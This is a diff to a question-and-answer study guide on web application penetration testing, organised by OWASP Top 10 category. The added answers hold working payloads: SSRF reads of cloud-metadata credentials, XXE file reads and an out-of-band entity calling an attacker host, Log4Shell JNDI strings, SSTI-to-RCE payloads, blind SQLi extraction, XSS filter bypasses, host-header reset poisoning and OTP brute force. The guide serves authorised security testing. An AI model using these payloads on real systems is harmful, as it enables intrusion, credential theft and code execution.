@@ -113,13 +113,13 @@ Effectively yes. **IDOR** is the classic web term; **BOLA** is the API term (API
 **How to test**
 
 ### Q18. What's the single most productive A01 technique?
-The **two-account differential**: do an action as user A, capture the exact request, replay it as user B (or against A's IDs with B's session) — success = authz not enforced server-side. Automate with Burp **Autorize/Autorepeater**.
+The **two-account differential**: do an action as user A, capture the exact request, replay it as user B (or against A's IDs with B's session) — success = authz not enforced server-side. **With Burp Autorize:** paste user B's (low-priv) `Cookie`/`Authorization` into Autorize, browse the app as A, and it colour-codes every replay — **green = enforced**, **red = bypassed**, **orange = review**. Always also test the **unauthenticated** case (strip the token entirely). A clean PoC is the *paired* evidence: identical request, two sessions, two outcomes — "as B I retrieved A's object 1337."
 
 ### Q19. How do you test the SSRF sub-class under A01?
 Find server-fetch sinks (URL params, webhooks, import-from-URL, link/image/PDF fetchers, SSO/OIDC metadata & JWKS). Point them at **`169.254.169.254`** (cloud metadata), localhost, internal IPs/hostnames → IAM creds / internal responses. For blind SSRF, confirm with an **OOB** listener. Bypass filters: DNS rebinding, redirect-to-internal (→ `OpenRedirect/`), IP encodings, IPv6, userinfo, alt schemes. → `SSRF/`.
 
 ### Q20. How do you test forced browsing and function-level authz?
-Enumerate **unlinked/privileged paths** directly (`/admin`, `/api/internal/*`, `/user/123/promote`) with a low-priv/no token; guess by pattern; mine JS bundles for routes. If GET `/users/{id}` exists, try POST/PUT/DELETE and `/users/{id}/promote`. "Button not shown" is a UI control, not security.
+Enumerate **unlinked/privileged paths** directly (`/admin`, `/api/internal/*`, `/user/123/promote`) with a low-priv/no token — `ffuf`/`feroxbuster` + SecLists, and mine JS bundles/Swagger for routes. If GET `/users/{id}` exists, try POST/PUT/DELETE and `/users/{id}/promote`. **When `/admin` returns 403, run the ACL-bypass matrix:** path-normalisation (`/admin/.`, `/./admin`, `//admin`, `/admin..;/`, `/admin%2f`, trailing dot/space, case-swap), header overrides (`X-Original-URL: /admin`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`), and **verb tampering** (403 on GET → POST/HEAD/`X-HTTP-Method-Override`). A 403 that flips to 200 is the finding. "Button not shown" is a UI control, not security.
 
 **Red-team / escalation**
 
@@ -151,6 +151,17 @@ Security by obscurity — a UUID leaked elsewhere (referrer/logs/another endpoin
 ### Q28. CWEs for A01?
 CWE-284, CWE-285, **CWE-639** (IDOR), CWE-862 (missing authz), CWE-863, CWE-22 (path), **CWE-918** (SSRF — now under A01).
 
+### Q28a. Give concrete mass-assignment payloads and how to confirm one.
+Add unexpected properties to a create/update body that the framework blind-binds to the model: `{"role":"admin"}`, `{"isAdmin":true}`, `{"is_verified":true}`, `{"balance":999999}`, `{"user_id":<victim>}`, `{"approved":true}`. Learn the real field names from a GET response/docs first; try nested (`{"user":{"role":"admin"}}`) and array forms. **Confirm with a follow-up read** — persistence is the proof. CWE-915 / OWASP API3 BOPLA; vulnerable patterns: Rails `update_attributes`, Node `Object.assign(model, req.body)`, Spring `@ModelAttribute`, Laravel `$fillable` gaps. → `IDOR/`.
+
+### Q28b. Give the cloud-metadata endpoints the SSRF sub-class targets (+ IMDSv2).
+Reach `169.254.169.254` and read credentials — the A01/SSRF money shot:
+- **AWS (IMDSv1):** `/latest/meta-data/iam/security-credentials/<role>` → temp keys. **IMDSv2** needs a token first: `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then `X-aws-ec2-metadata-token` on the GET — so a plain blind GET often can't reach it.
+- **GCP:** `/computeMetadata/v1/instance/service-accounts/default/token` + header `Metadata-Flavor: Google`.
+- **Azure:** `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` + header `Metadata: true`.
+
+Filter bypasses: decimal `2852039166`, hex `0xA9FEA9FE`, `[::ffff:169.254.169.254]`, `http://allowed@169.254.169.254/`, DNS rebinding, redirect-to-internal. Stolen creds → `aws sts get-caller-identity` (read-only proof) → cloud takeover. → `SSRF/`.
+
 ---
 
 # §A02 — SECURITY MISCONFIGURATION
@@ -166,7 +177,7 @@ XXE is a **parser configuration** problem — the XML parser is left with extern
 **How to test**
 
 ### Q31. Fastest A02 wins on most targets?
-**Exposure recon**: exposed `.git`/`.env`/backups (→ source + secrets), open cloud buckets, directory listing, default creds on admin/management interfaces, debug mode leaking stack traces/secrets, missing security headers. → `Recon/`, `JSFiles/`.
+**Exposure recon** — high-signal, quick: exposed **`.git`** (dump with `git-dumper` → full source + secrets), **`.env`**/backups (`.zip`,`.sql`,`~`,`.bak`), open cloud buckets, directory listing, **default creds** on management consoles (Tomcat Manager, Jenkins, Grafana, Spring `/actuator`), **debug mode** (Django `DEBUG=True`, Werkzeug console), missing security headers. Tooling: `nuclei` (exposures templates), `ffuf`/`dirsearch` + backup/config wordlist, `nikto`. → `Recon/`, `JSFiles/`.
 
 ### Q32. Which concrete classes/kits route from A02?
 `XXE/` (parser), `HostHeader/` (host-based reset/cache/routing), `CORS/` (permissive origin), `WebCache/` (cache poisoning/deception), `RequestSmuggling/` (front/back desync), `SubdomainTakeover/` (dangling DNS), `FileUpload/` (unrestricted upload→webshell), `Recon/`+`JSFiles/`.
@@ -192,6 +203,14 @@ Harden by default (no defaults, no debug in prod, minimal features/ports); disab
 ### Q37. CWEs for A02?
 CWE-16 (configuration), CWE-2, **CWE-611** (XXE), CWE-548 (directory listing), CWE-756, CWE-1032.
 
+### Q37a. Give the core XXE payloads (file read, SSRF, blind OOB).
+- **In-band file read:** `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`.
+- **PHP source** (base64): entity `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php">`.
+- **SSRF → metadata:** `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`.
+- **Blind OOB** (nothing reflected): host an external DTD with nested *parameter* entities so the file's contents return as a query string — `<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>` (full DTD in the `XXE/` kit).
+
+Also try **file-upload XXE** (SVG/DOCX/XLSX are zipped XML) and a **content-type switch** (`application/xml` to a JSON endpoint). Fix = disable DOCTYPE/external entities. → `XXE/`.
+
 ---
 
 # §A03 — SOFTWARE SUPPLY CHAIN FAILURES
@@ -209,7 +228,7 @@ It was **#1 in the community survey (50%)** and had the **highest incidence rate
 **How to test**
 
 ### Q40. How do you test the "vulnerable component" side of A03?
-**Fingerprint** components + versions (server headers, framework tells, JS libs via retire.js, package manifests, favicon hashes → `Recon/`, `JSFiles/`); **map to known CVEs**; **verify exploitability in-context**. RCE classes: Log4Shell (`JNDI/`), deserialization gadgets (`Deserialization/`), vulnerable front-end libs → XSS/prototype pollution.
+**Fingerprint** components + versions — server headers, framework tells, JS libs via **retire.js**/wappalyzer, package manifests (`package.json`/`composer.lock`/`pom.xml`), **favicon hash** (Shodan `http.favicon.hash`), `nmap -sV`, `whatweb`; **map to known CVEs** (GitHub Security Advisories, searchsploit); **verify reachability in-context** (Q42), fast-sweeping with `nuclei`. The headline reachable RCE is **Log4Shell (CVE-2021-44228)** — spray `${jndi:ldap://<token>.oob.net/x}` into logged fields (`User-Agent`/`X-Forwarded-For`/username), confirm via an OOB DNS hit, WAF-bypass with `${${lower:j}ndi:...}`; version matrix 2.0-beta9–2.14.1 = RCE, 2.16 removes lookups, 2.17.x fixed (→ `JNDI/`). Other RCE classes: deserialization gadgets (`Deserialization/`), vulnerable front-end libs → XSS/prototype pollution.
 
 ### Q41. How do you test the "malicious supply-chain" side of A03?
 **Dependency confusion / typosquatting / repo-jacking**: mine leaked manifests, committed `.npmrc`/`pip.conf` (proving private package names), JS bundles; check if an internal package name is **claimable** (public 404); prove with a **benign callback** (token + hostname only) from the target's CI, then unpublish + report. → `DependencyConfusion/`.
@@ -240,6 +259,14 @@ An app installs an *internal* package name (e.g. `acme-internal-utils`) from a p
 
 ### Q48. Prevention + CWEs for A03?
 Inventory components (**SBOM**); patch continuously; monitor advisories; remove unused deps; **pin + verify integrity/provenance** (signatures); **reserve internal package names** publicly; secure CI/CD (least privilege, signed builds, no injectable steps); SCA in CI. CWEs: CWE-1104 (unmaintained third-party), CWE-1395 (vulnerable dependency), CWE-1329, CWE-477.
+
+### Q48a. Walk a dependency-confusion PoC (authorized, benign).
+The Birsan-style test — prove a private package name is hijackable *without* weaponising it:
+1. **Harvest internal package names** — leaked `package.json`/`.npmrc`/`pip.conf`/`pom.xml` in JS bundles, git history, error messages, or CI logs (names like `@acme/internal-utils`).
+2. **Check claimability** — is that name a public **404** on the registry (npm/PyPI/…)? Unregistered = claimable.
+3. **Publish a benign, higher-version** package under the name whose install hook (`preinstall`/`setup.py`) only phones home a **token + hostname** — *no* data exfil, *no* other code — versioned `99.99.99` so the resolver's "highest version wins" picks yours.
+4. **A callback from the target's CI/build** = proof the misconfigured resolver pulled *your* public package instead of the private one → install-hook RCE in CI/CD.
+5. **Unpublish immediately**, report, tell them to reserve the name + scope the resolver. CWE-1395/CWE-829; ref Alex Birsan 2021. Authorized targets only, benign beacon only. → `DependencyConfusion/`.
 
 ---
 
@@ -299,10 +326,10 @@ Because XSS **is** injection — input interpreted as **code by the browser** (H
 **How to test**
 
 ### Q60. How do you detect injection with low false positives?
-**Prove interpretation, not reflection.** A reflected `'`/`;` is not a bug. Confirm the interpreter *acted*: boolean-differential pages, a **repeatable** time delay vs a control baseline (blind), an **OOB** callback carrying your marker, or real output. Control-baseline every probe.
+**Prove interpretation, not reflection.** A reflected `'`/`;` is not a bug. Confirm the interpreter *acted* via four oracles: (1) **boolean-differential** — `' AND '1'='1` vs `' AND '1'='2` return different pages; (2) **time-based** — `' AND SLEEP(5)-- -` delays *repeatably* vs a 0s control (run 3× to beat jitter); (3) **out-of-band** — the payload calls *your* listener (Collaborator/`interactsh`) with a per-injection marker (catches blind bugs with no visible response); (4) **real output** — an error string or `UNION`-returned data. Control-baseline every probe (send the benign version first).
 
 ### Q61. How do you distinguish SSTI vs XSS vs code injection?
-Math probe `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`: renders **49** server-side → **SSTI** (→ often RCE); reflected but executes in browser → **XSS**; language `eval` of input → **code injection**. Fingerprint the engine to pick the RCE payload. → `SSTI/`.
+Math probe `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`: renders **49** *server-side* → **SSTI** (→ often RCE); reflected and executes in the *browser* → **XSS**; language `eval` of input → **code injection**. Then fingerprint the engine (the RCE gadget differs): `{{7*'7'}}` → `49` = **Twig**; → `7777777` = **Jinja2**; `<%= 7*7 %>` → 49 = **ERB**; `{7*7}` → 49 = **Smarty**; `${7*7}` with `#{}` = **Freemarker/Velocity**. Then pick the RCE payload (Q69a). → `SSTI/`.
 
 **Red-team / escalation**
 
@@ -333,6 +360,21 @@ Content-Security-Policy restricts which script sources execute (nonce/hash/allow
 
 ### Q69. CWEs for A05?
 CWE-79 (XSS), CWE-89 (SQLi), CWE-78 (OS command), CWE-90 (LDAP), CWE-91/643 (XML/XPath), CWE-94 (code), CWE-1336/917 (template/EL), CWE-74 (generic injection).
+
+### Q69a. Give the go-to SSTI → RCE payloads per engine.
+Once fingerprinted (Q61), these pop a benign `id`:
+- **Jinja2 (Python):** `{{cycler.__init__.__globals__.os.popen('id').read()}}` or `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
+- **Twig (PHP):** `{{['id']|filter('system')}}` or `{{['id',1]|sort('system')}}`.
+- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
+- **Smarty (PHP):** `{system('id')}`. **ERB (Ruby):** `` <%= `id` %> ``.
+
+Automate with `tplmap`. Always a **benign** command, one proof, then stop. → `SSTI/`.
+
+### Q69b. How do you extract data with blind (boolean / time-based) SQLi?
+Turn the DB into a yes/no oracle and binary-search each char: **boolean** `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -` (page changes on a right guess; binary-search `ASCII()` with `>`/`<`); **time-based** MySQL `' AND IF(ASCII(SUBSTRING(...,1,1))>77,SLEEP(3),0)-- -`, MSSQL `WAITFOR DELAY '0:0:3'`, PostgreSQL `pg_sleep(3)`; **OOB** MSSQL `xp_dirtree`/Oracle `UTL_HTTP` exfil the secret as a DNS lookup. Automate with `sqlmap --technique=BT`, but extract only enough to prove impact (one hash). → `SQLi/`.
+
+### Q69c. How do you bypass a filter/WAF on reflected XSS?
+Ladder: (1) alternative vectors if `<script>` blocked — `<img src=x onerror=alert(document.domain)>`, `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`; (2) case/encoding — `<sCrIpt>`, HTML entities, URL/unicode; (3) no parens/quotes — `<svg onload=alert`1`>`, `onerror=alert(document.cookie)`; (4) context breakout — `"><svg onload=…>`, or JS-string break `';alert(1)//`; (5) DOM sinks (`location.hash` → `innerHTML`) often skip the server filter. CSP blocking inline → hunt an allow-listed/JSONP host or nonce reuse. Report the PoC firing in the victim's origin + real impact (cookie/session theft), not `alert(1)`. → `XSS/`.
 
 ---
 
@@ -384,7 +426,7 @@ Weaknesses in confirming identity, authenticating, and managing sessions — **r
 **How to test**
 
 ### Q79. Walk through testing a password-reset flow.
-Check **host/link poisoning** (Host header controls the reset link → capture token — → `HostHeader/`); **token entropy** (sequential/timestamp/short); **token leakage** (`Referer`/logs/response); **email HPP/CRLF** (second recipient); **no rate limit** (brute token/OTP); **reuse/expiry**; **user enumeration**. → `AccountTakeover/`.
+Check **host/link poisoning** — send the reset request with `Host: attacker.com` (or `X-Forwarded-Host: attacker.com`); if the emailed link points at *your* host, the victim's click leaks the token → **0-click ATO** (→ `HostHeader/`). Then: **token entropy** (sequential/timestamp/short → predictable), **token leakage** (`Referer`/logs/response body), **email HPP/CRLF** (`email=victim@x&email=attacker@x`, or CRLF `Cc:`), **no rate limit** (brute token/OTP), **reuse/expiry** (works twice? never expires? survives a newer token?), **user enumeration**. → `AccountTakeover/`.
 
 ### Q80. What headline OAuth/SSO flaws do you test?
 `redirect_uri` bypass (→ code/token theft), missing `state` (→ login CSRF / account-linking ATO), code replay, PKCE downgrade, `id_token` forgery (`alg:none`/unverified sig/`aud` swap), SAML XSW/sig-strip. → `OAuth/` (+ `JWT/`).
@@ -410,6 +452,9 @@ Multi-factor requires ≥2 of know/have/are. It blocks password-only stuffing/ph
 ### Q85. Prevention + CWEs for A07?
 MFA; no default/weak passwords + breached-password checks; **rate limiting + lockout** on all auth/OTP/reset endpoints; secure sessions (Q83); host-independent reset links + strong tokens; exact-match OAuth `redirect_uri` + `state` + PKCE; verify email before SSO linking. CWEs: CWE-287, CWE-384, CWE-307, CWE-620, CWE-640, CWE-798, CWE-613.
 
+### Q85a. How do you test 2FA/OTP for a rate-limit (brute-force) bypass?
+The flagship 2FA bug is **no rate limit on the OTP verify endpoint**. Request an OTP for *your own* account, then brute the 6-digit code (`000000`–`999999`) with Burp Intruder/`ffuf` — no lockout means one of a million tries wins → **2FA bypass**. Also test: **response manipulation** (verify returns `{"success":false}` → flip to `true`, does the app trust the client?), **step force-browsing** (skip to the post-2FA page), **OTP reuse / no expiry**, **backup-code brute**, **racing the verify** (→ `RaceCondition/`), **OTP echoed in the response**. Prove on your own account, stop at the first correct guess. → `AccountTakeover/`.
+
 ---
 
 # §A08 — SOFTWARE OR DATA INTEGRITY FAILURES
@@ -425,7 +470,7 @@ Deserializing attacker-controlled data can instantiate arbitrary objects and tri
 **How to test**
 
 ### Q88. How do you *safely* confirm deserialization without a shell?
-**OOB-first**: a benign gadget causing only a **DNS/HTTP callback** (Java **URLDNS**) or a `sleep` — proves the blob is deserialized *without* running attacker code on the target. Then stop and report (SAFE-PoC).
+**OOB-first**: a benign gadget that only makes a **DNS/HTTP callback** (Java **URLDNS**) or a `sleep`. Concretely: `java -jar ysoserial.jar URLDNS "http://<token>.oob.net" | base64` → drop it where the app deserializes (cookie, `rO0`-param, `__VIEWSTATE`) → a DNS hit = confirmed. URLDNS is ideal (works on a default classpath, no gadget lib, does nothing but resolve a host). Then stop and report (SAFE-PoC).
 
 ### Q89. What are ViewState and machineKey?
 ASP.NET **ViewState** is a serialized blob round-tripped via the client. If **not MAC-protected** or the **machineKey** is leaked/default, an attacker forges a malicious ViewState → deserialization → **RCE** (ysoserial.net). A leaked machineKey (via `.git`/config/LFI) → RCE — bridges A02/A04/A08. → `Deserialization/`.
@@ -447,6 +492,9 @@ Avoid deserializing untrusted data (or safe formats + type allow-lists + integri
 
 ### Q93. CWEs for A08?
 **CWE-502** (deserialization), CWE-345 (insufficient integrity), CWE-494 (download without integrity check), CWE-829, CWE-565.
+
+### Q93a. How do you recognise a serialized blob (magic bytes) per language?
+Fingerprint before attacking: **Java** — `AC ED 00 05` / Base64 **`rO0AB`**; **.NET BinaryFormatter** — `00 01 00 00 00 FF FF FF FF` / **`AAEAAAD/////`**; **Python pickle** — `\x80\x04…` / Base64 `gAS…`; **PHP** — `O:4:"User":…` / `a:2:{…}`, phar starts `<?php … __HALT_COMPILER();`; **Ruby Marshal** — `04 08` / **`BAh`**; **gzip-wrapped** — `1F 8B` / **`H4sI`**. Seeing one in a cookie/token/hidden field is the trigger to test deserialization (Q88). → `Deserialization/`.
 
 ---
 
@@ -497,7 +545,7 @@ Failing to **prevent, detect, and respond to unusual/unpredictable situations** 
 **How to test**
 
 ### Q102. How do you test for A10?
-**Break the app on purpose and watch how it fails**: send malformed/wrong-type/oversized/empty input; interrupt or parallelize a multi-step flow; exhaust a dependency; force an auth/validation component to error. Then observe: does it **fail open** (allow) or closed (deny)? does it **roll back** or leave partial/duplicate state? does the error **leak** stack traces / DB info / paths / secrets? does an exception leave a **resource locked** (→ DoS)?
+**Break the app on purpose and watch how it fails** — concrete triggers: **malformed/wrong-type** input (`age="abc"`, `id=[]`, a string where an object is expected), **oversized/empty** payloads, a **truncated multipart** upload, **race/interrupt** a multi-step flow (close the connection mid-transaction; send step 3 without step 2), or **exhaust a dependency** so the app's downstream call errors. Then observe: does it **fail open** (an errored auth/validation check defaults to *allow*)? **roll back**, or leave **partial/duplicate** state (half a payment, a double transfer)? **leak** a stack trace/DB error/internal path/secret in the error page? leave a **resource locked** (held DB connection/file handle → exhaustion → DoS)? Each "yes" is an A10 finding.
 
 ### Q103. Which kits help test A10, given no single kit owns it?
 `SQLi/` (error-based — verbose DB errors that leak schema); `Recon/` (verbose-error info disclosure → recon); `IDOR/` (an authz check that **fails open** on error = a bypass); `RaceCondition/` (interrupt/parallelize a multi-step transaction → partial/duplicate state). A10 is largely **methodology** — it's the discipline of testing the *failure* paths, not just the happy path.
@@ -526,6 +574,15 @@ Because a large class of real bugs lives in the **failure paths** — error hand
 
 ### Q108. Prevention + CWEs for A10?
 Catch exceptions at their source; centralized/global exception handling; **fail closed** (default-deny on error, complete rollback on partial failure); generic error messages (log detail server-side — ties A09); input validation + resource quotas + rate limiting; monitor repeated-error patterns as attack signals. CWEs: CWE-209 (sensitive error messages), CWE-234, CWE-476 (NULL deref), **CWE-636 (failing open insecurely)**.
+
+### Q108a. Give concrete fail-open / exceptional-condition test cases.
+- **Fail-open authz:** force a permission check to *error* (malformed token/role/ID that throws) — does the catch block return `true`/allow? A try/catch around auth that defaults to "permit" on exception is the classic CWE-636.
+- **No-rollback transaction:** interrupt or race a two-step money flow — is the debit committed without the credit (or vice-versa)? (overlaps A06 + race).
+- **Verbose-error recon:** trigger DB/stack errors (`'`, type confusion) → schema/paths/versions leak → feeds SQLi + component-CVE targeting (ties A09).
+- **Resource-lock DoS:** cause an exception mid-operation that leaves a lock/handle/connection held → repeat → exhaustion.
+- **Error-driven logic flip:** does an error midway leave the app *more* permissive (skipped validation, a defaulted flag)?
+
+Test by *breaking* the happy path, not walking it. → `IDOR/` (fail-open authz), `RaceCondition/` (partial txns), `SQLi/`+`Recon/` (error leaks).
 
 ---
 
